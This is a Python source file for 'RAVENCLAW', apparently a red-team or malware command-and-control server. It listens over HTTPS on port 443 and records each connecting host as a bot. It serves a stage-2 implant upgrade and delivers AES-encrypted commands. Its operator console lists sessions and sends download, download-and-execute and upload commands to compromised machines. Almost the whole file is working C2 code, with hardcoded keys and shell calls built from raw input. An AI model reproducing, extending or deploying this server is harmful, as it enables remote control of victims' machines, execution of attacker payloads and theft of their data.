import BaseHTTPServer
import SimpleHTTPServer
import SocketServer
import os
import sys
import ssl
import cgi
import re
import time
import base64
import hashlib
from Crypto.Cipher import AES
from Crypto import Random


sys.path.append("../")

from Cerberus.lib.dbmgr import *

LPORT = 443

#RAVENCLAW Server Handler
class ServerHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
   def do_GET(self):
      #logging.warning("============= GET STARTED ==============")
      #logging.warning(self.headers)


      #if new bot add record to db
      #print self.__dict__.keys()
      #print self.client_address[0]
      hosts = dbmgr().getHosts()
      newh = 1
      newc = 0
      i = 0
      for host in hosts:
         i = i + 1
         try:
            if str(self.client_address[0]) == host[1]:
               newh = 0
         except:
            pass

      if newh == 1:
         #Add new record to hostDB
         print "new host"
         dbmgr().newHost(self.client_address[0], "", "", "")
         dbmgr().newChannel(str(i+1), "", "")
         channelid = i+1

      elif newh == 0:
         channels = dbmgr().getHostChannels()
         for channel in channels:
            try:
               channelid = channel[0]
            except:
               channelid = ""
      '''
      elif new == 0:
         #Doesn't check for channel type modify in future assumes one channel per host
         channels = dbmgr().getChannels()
         for channel in channels:
            try:
               print channel[1]
               if self.client_address[0] == host[1]:
                  new = 1
            except:
               pass
      '''

      if self.path=='/s2.php':
         #Authenticated requests to this URL trigger the Ravenclaw stage 2 upgrade
         self.send_response(200)
         self.send_header('Content-type','text/html')
         self.end_headers()

         #Authenticate
         #Validate cookie string - sid=ravenclaw1

         #Upgrade
         self.wfile.write(ravenCTRL().upgrade()) #call sample function here
         return

      if self.path=='/cmd.php':
         #Ravenclaw stage2 command beacon/response
         self.send_response(200)
         self.send_header('Content-type','text/html')
         self.end_headers()

         #Authenticate
         #Validate cookie string - sid=ravenclaw1

         #Deliver command
         self.wfile.write(ravenCTRL().s2cmd(channelid)) #call sample function here
         return
      else:
         #print self.path
         SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self)

   def do_POST(self):
      #logging.warning("============= POST STARTED =============")
      #logging.warning(self.headers)
      ret = cgi.FieldStorage(
         fp=self.rfile,
         headers=self.headers,
         environ={'REQUEST_METHOD':'POST',
                  'CONTENT_TYPE': self.headers['Content-Type'],
                 })
      #logging.warning("============= POST VALUES ==============")
      for item in ret.list:
         encret = str(item).split("return',")[1][2:-2]

      #Perform Decryption
      #print encret
      try:
         resp = base64.b64decode(encret)
      except:
         resp = ""
      #print enc
      #ret = AESCipher("hacktheplanet").decrypt(encret)
      #print ret
      #No AES on the returns??? WTF???

      #Add ret to DB
      print resp


#Ravenclaw Controler
class ravenCTRL:
   def upgrade(self):
      #Update to pull local settings
      c2url = "10.0.0.105"
      returl = "10.0.0.105"
      cmd_url = '"https://' + c2url + '/cmd.php"'
      handler_url = '"https://' + returl + '/handler.htm"'

      with open("s2.php") as page:
         content = page.readlines()

      newlines = []
      #### Variable Parser
      for line in content:
         if "{{{" in line:
            r = re.compile('{{{(.*?)}}}')
            m = r.search(line)

            if m:
               print m.group(1)
               if m.group(1) == "cmd_url":
                  newlines.append(line.replace("{{{cmd_url}}}", cmd_url))
                  print line.replace("{{{cmd_url}}}", cmd_url)
                  #print "Building Table"
               elif m.group(1) == "handler_url":
                  newlines.append(line.replace("{{{handler_url}}}", cmd_url))
         else:
            newlines.append(line)


      site = ' '.join(newlines)

      return site

   def s2cmd(self, channelid):
      #Check DB for new command based on bot identifier
      commands = dbmgr().getInteractions(str(channelid))
      status = 0
      cmd = ""
      for cmdstring in commands:
         try:
            cmd = cmdstring[1]
            #print cmdstring[0], cmdstring[1]
            iid = str(cmdstring[0])
            status = 1
         except:
            pass
         break
      for cmdstring in commands:
         pass
      if status == 1:
         dbmgr().closeInteraction(iid)



      cmdstatus = 1 #more to come
      #Variables BotID

      if cmdstatus == 1:
         #Set beacontime
         #encrypt command

         cryptcmd = AESCipher("hacktheplanet").encrypt(cmd)
         #Set command as delivered in DB
         #print cryptcmd
         return cryptcmd

      else:
         response = "Knock, Knock, Neo"
         return response



class AESCipher:
   def __init__( self, key ):
      self.key = key
      self.salt = "CorrectHorseBatteryStaple"
      self.init = "Yet another key"

   def encrypt( self, raw ):
      word = map(ord, self.key) + map(ord, self.salt)
      word = "".join(map(chr, word))
      hash = hashlib.sha1(self.init).hexdigest()
      bray = map(ord, hash.upper())[0:15]
      hash = map(chr, bray)
      iv = "".join(hash)
      iv = iv[:-ord(iv[len(iv)-1:])]

      #iv = Random.new().read( AES.block_size )
      #init = "abcdefghijklmnopqrstuvwxyz"
      #iv = init[0:AES.block_size]
      #AES.block_size = 0x80
      iv = hashlib.sha1("test").hexdigest().upper()[0:16]
      key = hashlib.sha1("test").hexdigest().upper()[0:16]
      #raw = 'The answer is no'

      #Pad CMDs
      if len(raw) % 16 != 0:
         raw += ' ' * (16 - len(raw) %16)

      cipher = AES.new(key, AES.MODE_CBC, iv)
      return base64.b64encode(cipher.encrypt(raw))

   def decrypt( self, enc ):
      enc = base64.b64decode(enc)
      print enc
      iv = enc[:16]
      cipher = AES.new(self.key, AES.MODE_CBC, iv )
      return unpad(cipher.decrypt( enc[16:] ))

class Flocking:
   def __init__( self, target):
      self.target = target

   def execute(cmd):
      cryptcmd = AESCipher("hacktheplanet").encrypt(cmd)
      phphead = cryptcmd + "\"<?php include 'track.php';?>\""
      os.system("echo " + phphead + " > cmd.php")

class Raven:
   #def __init__(self)
   #   self.

   def menu(self):
      print "\nRAVENCLAW Help Menu:\n"
      print "help, ?          - Display this help menu"
      print "sessions         - Display clients"
      print "interact         - Enter client interaction mode"

      print ""
      print "Client Interaction Commands: (Must enter interactive mode)\n"
      print "download         - Download file <download url>"
      print "dlx              - Download and execute <dlx url>"
      print "upload           - Upload spcified file via post <upload file>"

      print "\n"

   def list(self):
      print "Avaliable sessions:"
      dirlist = compute_dir_index("log/")
      print "HOSTNAME        -   LAST CHECKIN"

      for client in dirlist["subdirs"]:
         if len(client) % 16 != 0:
            client += ' ' * (16 - len(client) %16)
         checklist = []
         for resp in dirlist["files"]:
            if client.rstrip(" ") in resp:
               checklist += "".join(resp.split("/")[1]) + ";"
               #print checklist, "".join(resp)

         lastcheck = "".join(checklist).split(";")#.sort()
         lastcheck.sort(reverse=True)
         try:
            print client + "-   " + str(lastcheck[1])
         except:
            print client + "-"

   def interact(self):
      Raven().list()
      target = raw_input("target: ")
      prompt = "raven_" + str(target) + ">"
      while True:
         try:
            cmd = raw_input(prompt)
            if cmd == "?" or cmd == "help":
               Raven().list()
            elif cmd == "exit":
               print ""
               break
            cryptcmd = AESCipher("hacktheplanet").encrypt(cmd)
            phphead = "\"<?php include 'track.php';?>\""
            os.system("echo " + cryptcmd + " > log/" + str(target) + "/manifest.txt")
            os.system("echo " + phphead + " > cmd.php")
         except KeyboardInterrupt:
            print ""
            break

   def mod(self):
      print "Knighthawks"



os.chdir("implants/ravenclaw/")

Handler = ServerHandler
SocketServer.TCPServer.allow_reuse_address=True
listener = SocketServer.TCPServer(("", LPORT), Handler)
listener.socket = ssl.wrap_socket (listener.socket, certfile='../../cert.pem', server_side=True)
listener.serve_forever()
